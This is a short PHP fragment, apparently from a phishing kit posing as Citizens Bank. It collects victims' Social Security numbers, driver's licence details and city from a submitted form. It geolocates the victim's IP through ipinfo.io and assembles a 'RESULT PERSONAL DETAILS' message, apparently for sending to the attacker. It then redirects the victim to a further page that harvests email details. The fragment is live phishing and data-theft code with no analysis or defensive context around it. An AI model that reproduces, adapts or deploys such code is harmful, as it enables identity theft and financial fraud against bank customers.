...
$CityR = $_POST['city'];
$SecurityNumber = $_POST['ssn'];
$LicenseNumber = $_POST['dl'];
$LicenseState = $_POST['dlstate'];
$LicenseNExp = $_POST['dlexp'];

$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

$message .= "+ ------------------------------------------ + \n";
$message .= "+ 🔓 CITIZENSBANK PERSONAL DETAILS | $ip 💎\n";
...
$subject="RESULT PERSONAL DETAILS | $ip ";
...
header("Location: ../EmailIdentification.php");
